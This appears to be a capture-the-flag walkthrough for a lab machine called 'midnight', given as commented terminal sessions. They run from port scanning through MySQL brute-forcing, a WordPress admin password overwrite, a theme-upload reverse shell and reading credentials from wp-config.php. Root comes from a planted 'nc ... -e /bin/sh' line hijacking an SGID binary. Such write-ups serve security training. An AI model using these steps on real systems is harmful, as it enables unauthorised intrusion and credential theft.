
// First, I will start enumerating the machine
```
┌──(root㉿kali)-[/home/astra]
└─# nmap -p- --min-rate 10000 -Pn -sV 192.168.164.88

Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 18:15 EST
Nmap scan report for 192.168.164.88
Host is up (0.13s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
3306/tcp open  mysql   MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.68 seconds
```
// We found an ssh, http and mysql port, I will search the web first

// Simply going to the website we can see it uses wordpress, so I will use wpscan to see if I find something interesting

// Nothing, so I will try and crack my way into the sql database using msfconsole to bruteforce it
```
┌──(root㉿kali)-[/home/astra]
└─# msfconsole                                   
                                                  
 ______________________________________
/ it looks like you're trying to run a \                                                                                                                   
\ module                               /                                                                                                                   
 --------------------------------------                                                                                                                    
 \                                                                                                                                                         
  \                                                                                                                                                        
     __                                                                                                                                                    
    /  \                                                                                                                                                   
    |  |                                                                                                                                                   
    @  @                                                                                                                                                   
    |  |                                                                                                                                                   
    || |/                                                                                                                                                  
    || ||                                                                                                                                                  
    |\_/|                                                                                                                                                  
    \___/                                                                                                                                                  
                                                                                                                                                           

       =[ metasploit v6.3.2-dev                           ]
+ -- --=[ 2290 exploits - 1201 auxiliary - 409 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use sessions -1 to interact with the 
last opened session
Metasploit Documentation: https://docs.metasploit.com/


msf6 > use auxiliary/scanner/mysql/mysql_login 

msf6 auxiliary(scanner/mysql/mysql_login) > set PASS_FILE /home/astra/rockyou.txt
PASS_FILE => /home/astra/rockyou.txt

msf6 auxiliary(scanner/mysql/mysql_login) > set RHOST 192.168.164.88
RHOST => 192.168.164.88

msf6 auxiliary(scanner/mysql/mysql_login) > run

[+] 192.168.164.88:3306   - 192.168.164.88:3306 - Found remote MySQL version 5.5.5
[!] 192.168.164.88:3306   - No active DB -- Credential data will not be saved!
[-] 192.168.164.88:3306   - 192.168.164.88:3306 - LOGIN FAILED: root: (Incorrect: Access denied for user 'root'@'192.168.45.5' (using password: NO))
[-] 192.168.164.88:3306   - 192.168.164.88:3306 - LOGIN FAILED: root:123456 (Incorrect: Access denied for user 'root'@'192.168.45.5' (using password: YES))
[-] 192.168.164.88:3306   - 192.168.164.88:3306 - LOGIN FAILED: root:12345 (Incorrect: Access denied for user 'root'@'192.168.45.5' (using password: YES))
[-] 192.168.164.88:3306   - 192.168.164.88:3306 - LOGIN FAILED: root:123456789 (Incorrect: Access denied for user 'root'@'192.168.45.5' (using password: YES))
[-] 192.168.164.88:3306   - 192.168.164.88:3306 - LOGIN FAILED: root:password (Incorrect: Access denied for user 'root'@'192.168.45.5' (using password: YES)
[+] 192.168.164.88:3306   - 192.168.164.88:3306 - Success: 'root:robert'
```
// Now we got the password for the user "root" and will login to the mysql database remotely
```
┌──(root㉿kali)-[/home/astra]
└─# mysql -h 192.168.164.88 -p

Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 346
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```
// Now we got access to the database, so now we will look for some login information
```
MariaDB [(none)]> show databases;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress_db       |
+--------------------+
4 rows in set (0.127 sec)

MariaDB [(none)]> use wordpress_db;

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress_db]> show tables;

+------------------------+
| Tables_in_wordpress_db |
+------------------------+
| wp_commentmeta         |
| wp_comments            |
| wp_links               |
| wp_options             |
| wp_postmeta            |
| wp_posts               |
| wp_sp_polls            |
| wp_term_relationships  |
| wp_term_taxonomy       |
| wp_termmeta            |
| wp_terms               |
| wp_usermeta            |
| wp_users               |
+------------------------+
13 rows in set (0.127 sec)

MariaDB [wordpress_db]> select * from wp_users;

+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url               | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ | admin         | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.129 sec)

MariaDB [wordpress_db]> 

```
// Now we got the password for the admin, but it is encrypted, I tried and couldn't get it decrypted, but we have access to the database, so may as well just change the password 
```
MariaDB [wordpress_db]> UPDATE wp_users SET user_pass="ff9830c42660c1dd1942844f8069b74a"
    -> WHERE ID=1;
    
Query OK, 1 row affected (0.133 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MariaDB [wordpress_db]> select * from wp_users;

+----+------------+----------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                        | user_nicename | user_email          | user_url               | user_registered     | user_activation_key | user_status | display_name |
+----+------------+----------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | ff9830c42660c1dd1942844f8069b74a | admin         | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 |                     |           0 | admin        |
+----+------------+----------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.127 sec)

MariaDB [wordpress_db]> 
```
// Now we changed the password for an md5 hash that I generated with cmd5.org, the hash decrypted is equal to "root123", so now I will try and login to the wordpress


![wearein](https://user-images.githubusercontent.com/47869173/220795741-63f9515b-926a-43cd-a399-00223bb9944e.jpg)


// Now we need to get access to the machine, after searching for a while I found out that msfconsole has an exploit that uploads an wordpress shell using admin login, so lets get to it


// I was getting some errors, so I reverted the machine, I still couldnt get the exploit to work, so I uploaded a shell as a theme, and reverse the connection to netcat

![reverse1](https://user-images.githubusercontent.com/47869173/220795818-62011fc2-4d81-4106-8039-4723895259ec.jpg)
![reverse2](https://user-images.githubusercontent.com/47869173/220795821-e0501967-5a59-43c4-869d-7046d6d4f58b.jpg)
![reverse3](https://user-images.githubusercontent.com/47869173/220795822-81c83034-f37d-47f6-9150-9ec15cf08c38.jpg)


//And now we curl it, and boom, we got access to it
```

┌──(root㉿kali)-[/home/astra]
└─# nc -lvnp 7777

listening on [any] 7777 ...
connect to [192.168.45.5] from (UNKNOWN) [192.168.164.88] 44648
Linux midnight 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
 19:10:29 up  1:28,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
//Lets starting by spawning an interactive shell and looking for the first flag
```

$ python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@midnight:/$ cd home
cd home

www-data@midnight:/home$ ls
ls
jose

www-data@midnight:/home$ cd jose
cd jose

www-data@midnight:/home/jose$ ls
ls
local.txt  user.txt

www-data@midnight:/home/jose$ cat lo
cat local.txt 
97f049b9e286e5582381beba2d92a78a

www-data@midnight:/home/jose$ 
```
// Now we escalate privileges, first I had found an user called "jose" so I switch to it by going to the wp-config file and getting jose's password
```

www-data@midnight:/home/jose$ cd /var/www/html/wordpress
cd /var/www/html/wordpress

www-data@midnight:/var/www/html/wordpress$ cat wp-config.php
cat wp-config.php

<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress_db' );

/** MySQL database username */
define( 'DB_USER', 'jose' );

/** MySQL database password */
define( 'DB_PASSWORD', '645dc5a8871d2a4269d4cbe23f6ae103' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '9F#)Pk/=&SyQ/>UVRBXx$}e&>G@(+m6L|_{Emur&fv&fO_+wbJ`-6QnE_7hI|Y<p');
define('SECURE_AUTH_KEY',  'p#Eh5#4W~p4-Iue2M)H/?[dp`BS;$7o~Kb%F?&S-Zv=rH#;U%`9G#VR`l^,8j$M+');
define('LOGGED_IN_KEY',    '0{YUw?X%j+ej-0du&FW@QkVP?b(#QsQfu[Q%<QS_Lpc1UI1|st:EJr)d*$g/iJ18');
define('NONCE_KEY',        '%)thH*l;)A^S#8WQ!8TKAnQ;uNXNKv<f.|PyYijgztda70y-4m~DTyqr^X!$JwX#');
define('AUTH_SALT',        '<Kd5.3^|yo:/fw2Y|PTb4!bU~5uRv7Z(n0;~jOXoO7MC]j/ICu[tY!)g4Oah-{oa');
define('SECURE_AUTH_SALT', 'dmYQvQ1Ap&z~JUHUaKR6]<rm7^ydGAp(/EH&+vrAi6cBpi?F7XKTc@Ahm:|h*wR;');
define('LOGGED_IN_SALT',   '5+Iw-;-j+2rD3WgRtSM`!zDb5I%LLU0]Awk-Cma:f4xrJv%k~/@+TthXY_[JpjfK');
define('NONCE_SALT',       'iDo3}y9z;@c~a)ZLT:7|.ZCp-0sK4>T1p&%MhGt_TUu+HFpPjn-no`:8sI0BA);y');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

www-data@midnight:/var/www/html/wordpress$ su jose 
su jose 

Password: 645dc5a8871d2a4269d4cbe23f6ae103

jose@midnight:/var/www/html/wordpress$ 
```
// And now we get to escalate privileges, I run linpeas and I find that SGID is showing /usr/bin/status, so I didn´t know what it was, I did a strings command and I found out that is a service for binary, so I thought of setting our own to call a netcat
```
jose@midnight:/var/www/html/wordpress$ strings /usr/bin/status

strings /usr/bin/status
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
Status of the SSH server:
service ssh status
;*3$"
GCC: (Debian 8.3.0-6) 8.3.0
```
// Now I will login to jose's ssh directly and start creating the service, and setting up netcat
```
jose@midnight:~$ cd /tmp
jose@midnight:/tmp$ ls

systemd-private-2ff9d0fe781a4163aa26a6f8d086db21-apache2.service-jti7IK            test
systemd-private-2ff9d0fe781a4163aa26a6f8d086db21-systemd-timesyncd.service-Qo6VIF  vmware-root_297-2126462102

jose@midnight:/tmp$ echo "nc 192.168.45.5 7777 -e /bin/sh" > service
jose@midnight:/tmp$ chmod +x service
jose@midnight:/tmp$ /usr/bin/status
```
// Got root access! Now lets get the flag!

![image](https://user-images.githubusercontent.com/47869173/220795941-68f48aa8-720d-429c-a033-62dad893fa3b.png)
```
listening on [any] 7777 ...
connect to [192.168.45.5] from (UNKNOWN) [192.168.164.88] 44660

id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(jose)

whoami
root

python -c 'import pty; pty.spawn("/bin/bash")'

root@midnight:/tmp# cd 
cd 

root@midnight:~# cd root
cd root

root@midnight:~# cd ..
cd ..

root@midnight:/home# cd ..
cd ..

root@midnight:/# cd root
cd root

root@midnight:/root# cat pro
cat proof.txt 
a54421f276f8412036c837083d012cc9
root@midnight:/root# 


